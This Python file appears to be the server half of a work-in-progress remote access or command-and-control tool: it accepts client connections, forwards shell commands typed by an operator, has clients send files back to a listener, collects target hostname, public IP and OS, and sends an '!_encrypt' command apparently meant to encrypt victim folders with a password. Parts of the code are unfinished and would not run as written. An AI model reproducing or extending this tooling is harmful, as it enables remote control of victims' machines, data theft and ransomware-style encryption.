## New Server Code

## Order: start socket, bind to address, and listen for connections. Each new
#connection needs to be in its own thread

import subprocess as sp
import socket
import threading
import time


#import imports
#import Modules.Linux.linux_info
#import Modules.Windows.windows_info


HEADER = 64
FORMAT = 'utf-8'


class s_sock:
    ##########
    ## Main Thread
    ##########
    
    def start_server(self, ip, port):
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ADDR = (ip,port)
        self.server.bind(self.ADDR)  
        
        self.server.listen()  
        
        ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
        while True:
            self.conn, addr = self.server.accept()
            print("Accepted Connection")
            thread = threading.Thread(target=self.handle_client, args=(self.conn, self.ADDR))
            thread.start()        
    
    
    ##########
    ## In Sub Thread
    ##########
    
    ## Each thread runs this, which will handle the client appropriatly.
    def handle_client(self, conn, addr):
        print(f"New Connection from {addr}")
        
        ## Listening for anythinf from the client
        while True:
            # Receive message from client
            received_msg = conn.recv(1024).decode()
            if not received_msg:
                # Client has closed the connection, exit the loop

                print("Conn Closed\n\n")
                break
            
            # Process the received message
            self.decision_tree(received_msg)
            
        # Close the connection when the loop is over
        conn.close()

    ## decision tree
    def decision_tree(self, msg):
        print(f"CLIENT SAYS: {msg}")

        if msg == "heartbeat":
            print("SERVER ACTION: client_do()")
            self.client_do()
        
    
    def client_do(self):
        
        ## Current job will be whatever the user wants to do... needs some thinking out on how to execute
        current_job = "wait"
        
        if current_job == "wait":
            self.send_msg("wait")
            #here the client heartbeat timer resets & it waits
        
        elif current_job == "shell":
            while True:
                shellcommand = input("$: ") ## eventually this unput will be from a different connection (from logec client) for now its local
                self.send_msg(shellcommand)
        
        
    
    def send_msg(self, message):
        
        self.conn.send(message.encode())
        
        print(f"Message being sent: {message}")
        #print("waiting on recieve message")
        
        '''recieve_msg = self.conn.recv(1024).decode() ## was 10000
        
        if recieve_msg == None:
            print("ERR")
            #self.conected = False
        #else:
            #self.decision_tree(recieve_msg)

          ## why are you still encoded
        print(f"Message: {recieve_msg}") 
        return recieve_msg'''
    
    
    def file_download(self, message): ## << message is the same as file in this case
        import filetransfer_server as fts
        
        lst = []
        
        for i in message.split():
            lst.append(i)
            
        print(lst)
        
        LISTEN_IP = lst[0]
        LISTEN_PORT = lst[1]
        SAVE_FILEPATH = lst[2]
        FILE_TO_GET = lst[3]
            
        
        #LISTEN_IP = "0.0.0.0"
        #LISTEN_PORT = 5000
        #SAVE_FILEPATH = file
        
        ## sending details TO THE LISTEN SERVER
        ## needs to be in a thread to not block the lower from running
        
        server_recieve = threading.Thread(target=fts.s_recieve_file, args=(LISTEN_IP, LISTEN_PORT, SAVE_FILEPATH))
        server_recieve.start()
        
        #fts.s_recieve_file(LISTEN_IP, LISTEN_PORT, SAVE_FILEPATH)
        
        ## Sending TO THE CLIENT
        message = f"!_get {LISTEN_IP} {LISTEN_PORT} {FILE_TO_GET}" 
        self.start_server.conn.send(message.encode()) ## sending to client to send the file
        return True

    def get_os(self):
        message = "!_os-name"
        self.start_server.conn.send(message.encode())
        os_name_recieve = self.start_server.conn.recv(10000).decode()
        return os_name_recieve

    

class s_action:
    
    def c_get_hostname(os):
        if os == "nt":
            return s_sock.send_msg(s_sock, windows_info.target.hostname())
        else:
            return s_sock.send_msg(s_sock, linux_info.target.hostname())
    
    def c_pub_ip(os):
        if os == "nt":
            return s_sock.send_msg(s_sock, windows_info.target.pub_ip())
        else:
            return s_sock.send_msg(s_sock, linux_info.target.pub_ip())
            
    
    def c_os(os):
        if os == "nt":
            return s_sock.send_msg(s_sock, windows_info.target.os())
        else:
            return s_sock.send_msg(s_sock, linux_info.target.os())

    
    def encryptor(folder, extension, password):
        s_sock.send_msg(s_sock, f"!_encrypt {folder} {extension} {password}")


if __name__ == "__main__":
    ## could listen on multiple ports with threading this whole thing
    SERV = s_sock()
    SERV.start_server('0.0.0.0',8089)
    #while True:
    
    '''while True:
        shellcommand = input("$: ")
        SERV.send_msg(shellcommand)'''